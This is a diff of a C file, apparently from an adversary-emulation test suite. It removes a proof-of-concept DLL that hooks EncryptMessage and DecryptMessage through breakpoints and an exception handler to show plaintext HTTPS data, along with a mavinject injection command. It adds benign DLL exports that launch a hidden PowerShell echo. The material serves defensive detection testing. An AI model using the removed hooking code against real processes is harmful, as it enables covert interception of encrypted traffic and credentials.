@@ -1,147 +1,95 @@
-#define SECURITY_WIN32 //Define First Before Imports.
-
 #include <windows.h>
-#include <stdio.h>
-#include <Sspi.h> //Be sure to reference secur32.lib in Linker | Input | Additional Dependencies
+#include <msi.h>
+#include <Msiquery.h>
+#pragma comment(lib, "msi.lib")
 
-FARPROC fpEncryptMessage; //Pointer To The Original Location
-BYTE bSavedByte; //Saved Byte Overwritten by 0xCC -
+UINT __stdcall CustomAction(MSIHANDLE hInstall) {
+	PROCESS_INFORMATION processInformation;
+	STARTUPINFO startupInfo;
+	BOOL creationResult;
 
-FARPROC fpDecryptMessage; //Pointer To The Original Location
-BYTE bSavedByte2; //Saved Byte Overwritten by 0xCC -
+	WCHAR szCmdline[] = L"powershell.exe -nop -Command Write-Host CustomAction export executed me; exit";
 
+	ZeroMemory(&processInformation, sizeof(processInformation));
+	ZeroMemory(&startupInfo, sizeof(startupInfo));
+	startupInfo.cb = sizeof(startupInfo);
+	creationResult = CreateProcess(
+		NULL,
+		szCmdline,
+		NULL,
+		NULL,
+		FALSE,
+		CREATE_NO_WINDOW,
+		NULL,
+		NULL,
+		&startupInfo,
+		&processInformation);
 
-// Original Idea/Reference Blog Post Here:
-// https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108
-// PoC by Casey Smith @subTee
-// From PowerShell
-// mavinject.exe $pid /INJECTRUNNING C:\AtomicTests\AtomicSSLHookx64.dll
-// curl https://www.example.com
-// Should Hook and Display Request/Response from HTTPS
-
-
-
-
-BOOL WriteMemory(FARPROC fpFunc, LPCBYTE b, SIZE_T size) {
-	DWORD dwOldProt = 0;
-	if (VirtualProtect(fpFunc, size, PAGE_EXECUTE_READWRITE, &dwOldProt) == FALSE) {
-		return FALSE;
-	}
-	MoveMemory(fpFunc, b, size);
-
-	return VirtualProtect(fpFunc, size, dwOldProt, &dwOldProt);
+	return 0;
 }
 
-//TODO, Combine  HOOK Function To take 2 params. DLL and Function Name.
-VOID HookFunction(VOID) {
-	fpEncryptMessage = GetProcAddress(LoadLibrary(L"sspicli.dll"), "EncryptMessage");
-	if (fpEncryptMessage == NULL) {
-		return;
-	}
+HRESULT DllRegisterServer() {
+	PROCESS_INFORMATION processInformation;
+	STARTUPINFO startupInfo;
+	BOOL creationResult;
 
-	bSavedByte = *(LPBYTE)fpEncryptMessage;
+	WCHAR szCmdline[] = L"powershell.exe -nop -Command Write-Host DllRegisterServer export executed me; exit";
 
-	const BYTE bInt3 = 0xCC;
-	if (WriteMemory(fpEncryptMessage, &bInt3, sizeof(BYTE)) == FALSE) {
-		ExitThread(0);
-	}
+	ZeroMemory(&processInformation, sizeof(processInformation));
+	ZeroMemory(&startupInfo, sizeof(startupInfo));
+	startupInfo.cb = sizeof(startupInfo);
+	creationResult = CreateProcess(
+		NULL,
+		szCmdline,
+		NULL,
+		NULL,
+		FALSE,
+		CREATE_NO_WINDOW,
+		NULL,
+		NULL,
+		&startupInfo,
+		&processInformation);
+
+	return 0;
 }
 
-VOID HookFunction2(VOID) {
-	fpDecryptMessage = GetProcAddress(LoadLibrary(L"sspicli.dll"), "DecryptMessage");
-	if (fpDecryptMessage == NULL) {
-		return;
-	}
+HRESULT DllUnregisterServer() {
+	PROCESS_INFORMATION processInformation;
+	STARTUPINFO startupInfo;
+	BOOL creationResult;
 
-	bSavedByte2 = *(LPBYTE)fpDecryptMessage;
+	WCHAR szCmdline[] = L"powershell.exe -nop -Command Write-Host DllUnregisterServer export executed me; exit";
 
-	const BYTE bInt3 = 0xCC;
-	if (WriteMemory(fpDecryptMessage, &bInt3, sizeof(BYTE)) == FALSE) {
-		ExitThread(0);
-	}
+	ZeroMemory(&processInformation, sizeof(processInformation));
+	ZeroMemory(&startupInfo, sizeof(startupInfo));
+	startupInfo.cb = sizeof(startupInfo);
+	creationResult = CreateProcess(
+		NULL,
+		szCmdline,
+		NULL,
+		NULL,
+		FALSE,
+		CREATE_NO_WINDOW,
+		NULL,
+		NULL,
+		&startupInfo,
+		&processInformation);
+
+    return 0;
 }
 
-SECURITY_STATUS MyEncryptMessage(
-	PCtxtHandle    phContext,
-	ULONG          fQOP,
-	PSecBufferDesc pMessage,
-	ULONG          MessageSeqNo
-)
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
 {
-
-	char* buffer = (char*)((DWORD_PTR)(pMessage->pBuffers->pvBuffer) + 0x29); //Just Hardcode for PoC
-
-	::MessageBoxA(NULL, buffer, "MITM Intercept", 0);
-
-	if (WriteMemory(fpEncryptMessage, &bSavedByte, sizeof(BYTE)) == FALSE) {
-		ExitThread(0);
-	}
-
-	SECURITY_STATUS SEC_EntryRet = EncryptMessage(phContext, fQOP, pMessage, MessageSeqNo);
-	HookFunction();
-	return SEC_EntryRet;
-}
-
-SECURITY_STATUS MyDecryptMessage(
-	PCtxtHandle    phContext,
-	PSecBufferDesc pMessage,
-	ULONG          MessageSeqNo,
-	ULONG          fQOP
-)
-{
-
-	if (WriteMemory(fpDecryptMessage, &bSavedByte2, sizeof(BYTE)) == FALSE) {
-		ExitThread(0);
-	}
-
-	SECURITY_STATUS SEC_EntryRet = DecryptMessage(phContext, pMessage, MessageSeqNo, &fQOP );
-
-	char* buffer = (char*)(pMessage->pBuffers->pvBuffer);
-
-	::MessageBoxA(NULL, buffer, "MITM Intercept", 0);
-
-	HookFunction2();
-	return SEC_EntryRet;
-}
-
-
-LONG WINAPI
-MyVectoredExceptionHandler1(
-	struct _EXCEPTION_POINTERS *ExceptionInfo
-)
-{
-		UNREFERENCED_PARAMETER(ExceptionInfo);
-#ifdef _WIN64
-	if (ExceptionInfo->ContextRecord->Rip == (DWORD_PTR)fpEncryptMessage) {
-		ExceptionInfo->ContextRecord->Rip = (DWORD_PTR)MyEncryptMessage;
-	}
-
-	if (ExceptionInfo->ContextRecord->Rip == (DWORD_PTR)fpDecryptMessage) {
-		ExceptionInfo->ContextRecord->Rip = (DWORD_PTR)MyDecryptMessage;
-	}
-
-#else
-	if (ExceptionInfo->ContextRecord->Eip == (DWORD_PTR)fpEncryptMessage) {
-		ExceptionInfo->ContextRecord->Eip = (DWORD_PTR)MyEncryptMessage;
-	}
-
-	if (ExceptionInfo->ContextRecord->Eip == (DWORD_PTR)fpDecryptMessage) {
-		ExceptionInfo->ContextRecord->Eip = (DWORD_PTR)MyDecryptMessage;
-	}
-
-#endif
-	return EXCEPTION_CONTINUE_SEARCH;
-}
-
-BOOL APIENTRY DllMain(HANDLE hInstance, DWORD fdwReason, LPVOID lpReserved) {
-	switch (fdwReason) {
-	case DLL_PROCESS_ATTACH:
-		AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)MyVectoredExceptionHandler1);
-		HookFunction();
-		HookFunction2();
-		::MessageBoxA(NULL, "Locked and Loaded!", "Boom!", 0);
-		break;
-	}
-
-	return TRUE;
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
 }
